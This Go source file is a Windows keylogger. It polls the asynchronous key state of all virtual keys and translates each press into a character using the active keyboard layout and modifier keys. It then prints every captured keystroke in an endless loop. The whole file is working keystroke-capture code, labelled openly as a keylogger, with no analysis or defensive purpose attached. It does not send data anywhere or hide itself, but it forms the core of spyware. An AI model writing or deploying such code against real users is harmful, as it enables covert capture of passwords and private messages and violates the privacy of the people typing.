// Package keylogger is a keylogger for windows
package main

import (
	"fmt"
	"syscall"
	"time"
	"unicode/utf8"
	"unsafe"

	"github.com/TheTitanrain/w32"
)

const (
	TIME_UNTIL_CAPTURE = 5
)

var (
	user32LIB = syscall.NewLazyDLL("user32.dll")

	procGetKeyboardLayout = user32LIB.NewProc("GetKeyboardLayout")
	procToUnicodeEx       = user32LIB.NewProc("ToUnicodeEx")
	procGetKeyState       = user32LIB.NewProc("GetKeyState")
)

// Keylogger represents the keylogger
type Keylogger struct {
	lastKey int
}

// Key is a single key entered by the user
type Key struct {
	Empty   bool
	Rune    rune
	Keycode int
}

// NewKeyLogger creates new keylogger
func NewKeyLogger() Keylogger {
	kl := Keylogger{}

	return kl
}

// PressedKey gets the current entered key by the user, if there is any
func (kl *Keylogger) PressedKey() Key {
	currentKey := 0
	var currentKeyState uint16

	for i := 0; i < 256; i++ {
		currentKeyState = w32.GetAsyncKeyState(i)

		// Check if the most significant bit is set (key is down)
		// And check if the key is not a non-char key (except for space, 0x20)
		if currentKeyState&(1<<15) != 0 && !(i < 0x2F && i != 0x20) && (i < 160 || i > 165) && (i < 91 || i > 93) {
			currentKey = i
			break
		}
	}

	if currentKey != 0 {
		if currentKey != kl.lastKey {
			kl.lastKey = currentKey
			return kl.ParseKeycode(currentKey)
		}
	} else {
		kl.lastKey = 0
	}

	return Key{Empty: true}
}

// ParseKeycode returns the correct Key struct for a key taking in account the current keyboard settings
// That struct contains the Rune for the key
func (kl Keylogger) ParseKeycode(keyCode int) Key {
	key := Key{Empty: false, Keycode: keyCode}

	// Only one rune has to fit in
	outBuf := make([]uint16, 1)

	// Buffer to store the keyboard state in
	kbState := make([]uint8, 256)

	// Get keyboard layout for this process (0)
	kbLayout, _, _ := procGetKeyboardLayout.Call(uintptr(0))

	// Put all key modifier keys inside the kbState list
	if w32.GetAsyncKeyState(w32.VK_SHIFT)&(1<<15) != 0 {
		kbState[w32.VK_SHIFT] = 0xFF
	}

	capitalState, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
	if capitalState != 0 {
		kbState[w32.VK_CAPITAL] = 0xFF
	}

	if w32.GetAsyncKeyState(w32.VK_CONTROL)&(1<<15) != 0 {
		kbState[w32.VK_CONTROL] = 0xFF
	}

	if w32.GetAsyncKeyState(w32.VK_MENU)&(1<<15) != 0 {
		kbState[w32.VK_MENU] = 0xFF
	}

	_, _, _ = procToUnicodeEx.Call(
		uintptr(keyCode),
		uintptr(0),
		uintptr(unsafe.Pointer(&kbState[0])),
		uintptr(unsafe.Pointer(&outBuf[0])),
		uintptr(1),
		uintptr(1),
		kbLayout)

	key.Rune, _ = utf8.DecodeRuneInString(syscall.UTF16ToString(outBuf))

	return key
}

func main() {
	kl := NewKeyLogger()

	for {
		key := kl.PressedKey()

		if !key.Empty {
			fmt.Printf("'%c'\n", key.Rune)
		}

		time.Sleep(TIME_UNTIL_CAPTURE * time.Millisecond)
	}
}
